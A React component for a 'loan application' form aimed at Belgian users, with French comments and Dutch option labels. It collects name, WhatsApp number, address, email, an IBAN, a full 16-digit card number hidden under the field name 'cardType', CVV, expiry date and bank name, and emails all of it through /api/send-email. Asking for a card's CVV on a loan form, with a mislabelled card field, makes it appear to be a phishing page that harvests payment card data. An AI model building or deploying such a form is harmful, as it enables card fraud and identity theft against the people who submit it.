import React, { useState, useEffect } from 'react';
import { Form, Input, Select, Button, Card, message, Row, Col } from 'antd';
import { useLanguage } from '../contexts/LanguageContext';
import { 
  UserIcon, 
  EnvelopeIcon, 
  CreditCardIcon, 
  PhoneIcon,
  BanknotesIcon 
} from '@heroicons/react/24/outline';

const { Option } = Select;

const LoanForm: React.FC = () => {
  const { t } = useLanguage();
  const [form] = Form.useForm();
  const [loading, setLoading] = useState(false);

  // Initialiser le champ WhatsApp avec +32 par défaut
  useEffect(() => {
    form.setFieldsValue({ whatsapp: '+32 ' });
  }, [form]);

  // Fonction de formatage pour le numéro de téléphone WhatsApp (format: +32 XXX XX XX XX)
  const formatPhoneNumber = (value: string) => {
    // Supprimer tous les caractères non numériques sauf +
    let cleaned = value.replace(/[^\d+]/g, '');
    
    if (cleaned.startsWith('+')) {
      const numbers = cleaned.slice(1).replace(/\D/g, '');
      if (numbers.length === 0) return '+';
      if (numbers.length <= 2) return `+${numbers} `;
      
      // Formater : +32 XXX XX XX XX (code pays + espace + 3 chiffres + espace + 2 chiffres + espace + 2 chiffres + espace + 2 chiffres)
      let formatted = `+${numbers.slice(0, 2)} `;
      const remaining = numbers.slice(2);
      
      if (remaining.length > 0) {
        // Premier groupe de 3 chiffres
        formatted += remaining.slice(0, 3);
        const afterFirst = remaining.slice(3);
        
        if (afterFirst.length > 0) {
          formatted += ' ';
          // Groupes suivants de 2 chiffres
          for (let i = 0; i < afterFirst.length; i += 2) {
            if (i > 0) formatted += ' ';
            formatted += afterFirst.slice(i, i + 2);
          }
        }
      }
      
      // Limiter à +32 XXX XX XX XX = 16 caractères max
      return formatted.substring(0, 16);
    } else {
      const numbers = cleaned.replace(/\D/g, '');
      if (numbers.length === 0) return '+32 ';
      if (numbers.length <= 2) return `+${numbers} `;
      
      // Ajouter +32 au début et formater
      let formatted = `+${numbers.slice(0, 2)} `;
      const remaining = numbers.slice(2);
      
      if (remaining.length > 0) {
        // Premier groupe de 3 chiffres
        formatted += remaining.slice(0, 3);
        const afterFirst = remaining.slice(3);
        
        if (afterFirst.length > 0) {
          formatted += ' ';
          // Groupes suivants de 2 chiffres
          for (let i = 0; i < afterFirst.length; i += 2) {
            if (i > 0) formatted += ' ';
            formatted += afterFirst.slice(i, i + 2);
          }
        }
      }
      
      return formatted.substring(0, 16);
    }
  };

  // Fonction de formatage pour le numéro de carte BE (format: BE15 9512 1369 7465)
  const formatCardNumber = (value: string) => {
    // Convertir en majuscules et garder BE et les chiffres
    let cleaned = value.toUpperCase().replace(/[^BE0-9]/g, '');
    
    // Si commence par BE, garder BE
    if (cleaned.startsWith('BE')) {
      const numbers = cleaned.slice(2).replace(/\D/g, '');
      if (numbers.length === 0) return 'BE';
      
      // Formater BE suivi de 2 chiffres, puis espaces tous les 4 chiffres
      let formatted = 'BE' + numbers.slice(0, 2);
      const remaining = numbers.slice(2);
      
      if (remaining.length > 0) {
        formatted += ' ';
        const match = remaining.match(/.{1,4}/g);
        if (match) {
          formatted += match.join(' ');
        }
      }
      
      // Limiter à BE + 2 chiffres + 3 groupes de 4 chiffres = 19 caractères max
      return formatted.substring(0, 19);
    } else {
      // Si ne commence pas par BE, ajouter BE automatiquement
      const numbers = cleaned.replace(/\D/g, '');
      if (numbers.length === 0) return 'BE';
      
      let formatted = 'BE' + numbers.slice(0, 2);
      const remaining = numbers.slice(2);
      
      if (remaining.length > 0) {
        formatted += ' ';
        const match = remaining.match(/.{1,4}/g);
        if (match) {
          formatted += match.join(' ');
        }
      }
      
      return formatted.substring(0, 19);
    }
  };

  // Fonction de formatage pour le type de carte (format: XXXX XXXX XXXX XXXX)
  const formatCardType = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    if (cleaned.length === 0) return '';
    
    // Formater avec des espaces après chaque groupe de 4 chiffres
    const match = cleaned.match(/.{1,4}/g);
    if (match) {
      return match.join(' ').substring(0, 19); // Max 16 chiffres + 3 espaces
    }
    return cleaned;
  };

  // Fonction de formatage pour la date d'expiration (MM/YY)
  const formatExpiryDate = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    if (cleaned.length === 0) return '';
    if (cleaned.length === 1) {
      const first = cleaned[0];
      if (first > '1') return `0${first}`;
      return first;
    }
    if (cleaned.length >= 2) {
      let month = cleaned.slice(0, 2);
      const monthNum = parseInt(month);
      if (monthNum > 12) {
        month = '12';
      } else if (monthNum === 0) {
        month = '01';
      } else if (monthNum < 10 && !month.startsWith('0')) {
        month = `0${monthNum}`;
      }
      if (cleaned.length === 2) {
        return month;
      }
      const year = cleaned.slice(2, 4);
      return month + '/' + year;
    }
    return cleaned;
  };

  const onFinish = async (values: any) => {
    setLoading(true);
    try {
      const response = await fetch('/api/send-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(values),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || t.form.error);
      }

      message.success(t.form.success);
      form.resetFields();
    } catch (error: any) {
      console.error('Erreur:', error);
      message.error(error.message || t.form.error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <Card className="shadow-2xl rounded-2xl border-t-4 border-orange-500">
      <div className="text-center mb-8">
        <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-br from-orange-500 to-red-600 rounded-full mb-4">
          <CreditCardIcon className="w-8 h-8 text-white" />
        </div>
        <h2 className="text-3xl font-bold bg-gradient-to-r from-red-600 via-orange-500 to-blue-600 bg-clip-text text-transparent">
          {t.form.title}
        </h2>
      </div>
      
      <Form
        form={form}
        layout="vertical"
        onFinish={onFinish}
        size="large"
        className="max-w-4xl mx-auto"
      >
        <Row gutter={16}>
          <Col xs={24} sm={12}>
            <Form.Item
              name="lastName"
              label={t.form.fields.lastName}
              rules={[{ required: true, message: `${t.form.fields.lastName} ${t.form.validation.required}` }]}
            >
              <Input 
                prefix={<UserIcon className="w-4 h-4 text-gray-400" />}
                placeholder={t.form.placeholders.lastName}
                autoComplete="family-name"
              />
            </Form.Item>
          </Col>
          
          <Col xs={24} sm={12}>
            <Form.Item
              name="firstName"
              label={t.form.fields.firstName}
              rules={[{ required: true, message: `${t.form.fields.firstName} ${t.form.validation.required}` }]}
            >
              <Input 
                prefix={<UserIcon className="w-4 h-4 text-gray-400" />}
                placeholder={t.form.placeholders.firstName}
                autoComplete="given-name"
              />
            </Form.Item>
          </Col>
        </Row>

        <Row gutter={16}>
          <Col xs={24} sm={12}>
            <Form.Item
              name="nationality"
              label={t.form.fields.nationality}
              rules={[{ required: true, message: `${t.form.fields.nationality} ${t.form.validation.required}` }]}
            >
              <Select placeholder={t.form.placeholders.nationality}>
                <Option value="nl">Nederlands</Option>
                <Option value="fr">Frans</Option>
                <Option value="be">Belgisch</Option>
                <Option value="de">Duits</Option>
                <Option value="other">Andere</Option>
              </Select>
            </Form.Item>
          </Col>
          
          <Col xs={24} sm={12}>
            <Form.Item
              name="whatsapp"
              label={t.form.fields.whatsapp}
              rules={[
                { required: true, message: `${t.form.fields.whatsapp} ${t.form.validation.required}` },
                { pattern: /^\+32\s\d{3}\s\d{2}\s\d{2}\s\d{2}$/, message: t.form.validation.invalidPhone }
              ]}
            >
              <Input 
                prefix={<PhoneIcon className="w-4 h-4 text-gray-400" />}
                placeholder={t.form.placeholders.whatsapp}
                autoComplete="tel"
                onChange={(e) => {
                  const formatted = formatPhoneNumber(e.target.value);
                  e.target.value = formatted;
                  form.setFieldsValue({ whatsapp: formatted });
                }}
              />
            </Form.Item>
          </Col>
        </Row>

        <Form.Item
          name="address"
          label={t.form.fields.address}
          rules={[{ required: true, message: `${t.form.fields.address} ${t.form.validation.required}` }]}
        >
          <Input.TextArea 
            rows={3} 
            placeholder={t.form.placeholders.address}
            autoComplete="street-address"
          />
        </Form.Item>

        <Form.Item
          name="email"
          label={t.form.fields.email}
          rules={[
            { required: true, message: `${t.form.fields.email} ${t.form.validation.required}` },
            { type: 'email', message: t.form.validation.invalidEmail }
          ]}
        >
          <Input 
            prefix={<EnvelopeIcon className="w-4 h-4 text-gray-400" />}
            placeholder={t.form.placeholders.email}
            autoComplete="email"
          />
        </Form.Item>

        <Row gutter={16}>
          <Col xs={24} sm={12}>
            <Form.Item
              name="cardNumber"
              label={t.form.fields.cardNumber}
              rules={[
                { required: true, message: `${t.form.fields.cardNumber} ${t.form.validation.required}` },
                { pattern: /^BE\d{2}\s\d{4}\s\d{4}\s\d{4}$/, message: t.form.validation.invalidCard }
              ]}
            >
              <Input 
                prefix={<CreditCardIcon className="w-4 h-4 text-gray-400" />}
                placeholder={t.form.placeholders.cardNumber}
                maxLength={19}
                autoComplete="cc-number"
                onChange={(e) => {
                  const formatted = formatCardNumber(e.target.value);
                  e.target.value = formatted;
                  form.setFieldsValue({ cardNumber: formatted });
                }}
              />
            </Form.Item>
          </Col>
          
          <Col xs={24} sm={12}>
            <Form.Item
              name="cardType"
              label={t.form.fields.cardType}
              rules={[
                { required: true, message: `${t.form.fields.cardType} ${t.form.validation.required}` }
              ]}
            >
              <Input 
                prefix={<CreditCardIcon className="w-4 h-4 text-gray-400" />}
                placeholder={t.form.placeholders.cardType}
                maxLength={19}
                onChange={(e) => {
                  const formatted = formatCardType(e.target.value);
                  e.target.value = formatted;
                  form.setFieldsValue({ cardType: formatted });
                }}
              />
            </Form.Item>
          </Col>
        </Row>

        <Row gutter={16}>
          <Col xs={24} sm={8}>
            <Form.Item
              name="cvv"
              label={t.form.fields.cvv}
              rules={[
                { required: true, message: `${t.form.fields.cvv} ${t.form.validation.required}` },
                { pattern: /^\d{3,4}$/, message: t.form.validation.invalidCvv }
              ]}
            >
              <Input 
                placeholder={t.form.placeholders.cvv} 
                maxLength={4}
                autoComplete="cc-csc"
              />
            </Form.Item>
          </Col>
          
          <Col xs={24} sm={8}>
            <Form.Item
              name="expiryDate"
              label={t.form.fields.expiryDate}
              rules={[
                { required: true, message: `${t.form.fields.expiryDate} ${t.form.validation.required}` },
                { pattern: /^(0[1-9]|1[0-2])\/\d{2}$/, message: t.form.validation.invalidExpiry }
              ]}
            >
              <Input 
                placeholder={t.form.placeholders.expiryDate} 
                maxLength={5}
                autoComplete="cc-exp"
                onChange={(e) => {
                  const formatted = formatExpiryDate(e.target.value);
                  e.target.value = formatted;
                  form.setFieldsValue({ expiryDate: formatted });
                }}
              />
            </Form.Item>
          </Col>
          
          <Col xs={24} sm={8}>
            <Form.Item
              name="bankName"
              label={t.form.fields.bankName}
              rules={[{ required: true, message: `${t.form.fields.bankName} ${t.form.validation.required}` }]}
            >
              <Input 
                prefix={<BanknotesIcon className="w-4 h-4 text-gray-400" />}
                placeholder={t.form.placeholders.bankName}
                autoComplete="organization"
              />
            </Form.Item>
          </Col>
        </Row>

        <Form.Item className="text-center mt-8">
          <Button
            type="primary"
            htmlType="submit"
            loading={loading}
            size="large"
            className="bg-gradient-to-r from-orange-500 to-red-600 hover:from-orange-600 hover:to-red-700 border-0 px-10 h-14 text-lg font-semibold shadow-lg hover:shadow-xl transition-all duration-300 hover:scale-105"
          >
            {t.form.submit}
          </Button>
          <Button
            type="default"
            onClick={() => form.resetFields()}
            size="large"
            className="ml-4 px-10 h-14 hover:border-orange-500 hover:text-orange-500 transition-all duration-300"
          >
            {t.form.reset}
          </Button>
        </Form.Item>
      </Form>
    </Card>
  );
};

export default LoanForm;
